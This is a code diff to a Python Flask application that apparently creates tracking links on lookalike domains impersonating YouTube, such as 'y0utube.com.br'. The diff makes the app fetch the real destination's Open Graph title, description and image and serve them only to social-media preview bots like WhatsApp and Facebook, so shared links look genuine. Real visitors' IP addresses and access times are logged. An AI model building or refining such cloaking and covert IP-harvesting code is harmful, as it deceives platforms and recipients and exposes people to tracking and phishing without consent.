@@ -1,3 +1,4 @@
+
 from flask import Flask, request, render_template, jsonify, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
@@ -9,6 +10,9 @@ from flask_migrate import Migrate
 import os
 import re
 from werkzeug.utils import secure_filename
+from flask import request, render_template, redirect
+import requests
+from bs4 import BeautifulSoup
 
 DOMINIOS_FALSOS = {
     "youtube": ["youtube.c0m.lat", "y0utube.com.br", "you-tube.video"],
@@ -216,15 +220,29 @@ def rastrear_link(slug):
     link = Link.query.filter_by(slug=slug).first_or_404()
 
     user_agent = request.headers.get("User-Agent", "").lower()
-
-    # Lista de bots comuns de redes sociais
     bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
 
     if any(bot in user_agent for bot in bots):
-        # Se for bot, renderiza preview
-        return render_template("preview.html", link=link)
+        try:
+            # Tenta buscar os metadados reais do site de destino
+            resposta = requests.get(link.destino, timeout=5)
+            soup = BeautifulSoup(resposta.text, "html.parser")
 
-    # Visitante real → salvar IP e dados
+            og_title = soup.find("meta", property="og:title")
+            og_desc = soup.find("meta", property="og:description")
+            og_image = soup.find("meta", property="og:image")
+
+            return render_template("preview_real.html",
+                titulo=og_title["content"] if og_title else "Acesse este link",
+                descricao=og_desc["content"] if og_desc else "Clique para visualizar o conteúdo.",
+                imagem=og_image["content"] if og_image else url_for('static', filename='fallback.jpg', _external=True),
+                url_destino=link.destino
+            )
+        except:
+            # Se der erro, usa um fallback padrão
+            return render_template("preview_fallback.html", url_destino=link.destino)
+
+    # Se não for bot, registra o acesso normalmente
     visitor_ip = request.remote_addr
     timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
